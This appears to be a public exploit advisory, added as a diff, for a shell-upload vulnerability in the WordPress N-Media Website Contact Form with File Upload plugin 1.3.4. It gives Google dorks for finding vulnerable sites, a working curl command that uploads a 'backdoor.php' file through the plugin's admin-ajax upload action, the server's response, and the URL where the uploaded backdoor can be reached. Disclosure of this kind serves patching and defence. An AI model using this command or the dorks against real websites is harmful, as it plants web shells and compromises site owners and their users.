@@ -1,0 +1,55 @@
+######################
+
+# Exploit Title : Wordpress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload Vulnerability
+
+# Exploit Author : Claudio Viviani
+
+
+# Software Link : https://downloads.wordpress.org/plugin/website-contact-form-with-file-upload.1.3.4.zip
+
+# Date : 2015-04-1
+
+# Dork Google: index of website-contact-form-with-file-upload
+               index of /uploads/contact_files/
+
+# Tested on : Linux BackBox 4.0 / curl 7.35.0
+
+#####################
+
+# Info :  
+
+ The "upload_file()" ajax function is affected from unrestircted file upload vulnerability.
+
+
+######################
+
+# PoC:
+
+ curl -k -X POST -F "action=upload" -F "Filedata=@./backdoor.php" -F "action=nm_webcontact_upload_file" http://VICTIM/wp-admin/admin-ajax.php
+ 
+ 
+ Response: {"status":"uploaded","filename":"1427927588-backdoor.php"}
+
+
+######################
+
+# Backdoor Location:
+
+ http://VICTIM/wp-content/uploads/contact_files/1427927588-backdoor.php
+ 
+
+#####################
+
+Discovered By : Claudio Viviani
+                http://www.homelab.it
+	        http://ffhd.homelab.it (Free Fuzzy Hashes Database)
+				
+                info@homelab.it
+                homelabit@protonmail.ch
+
+                https://www.facebook.com/homelabit
+                https://twitter.com/homelabit
+                https://plus.google.com/+HomelabIt1/
+                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+#####################
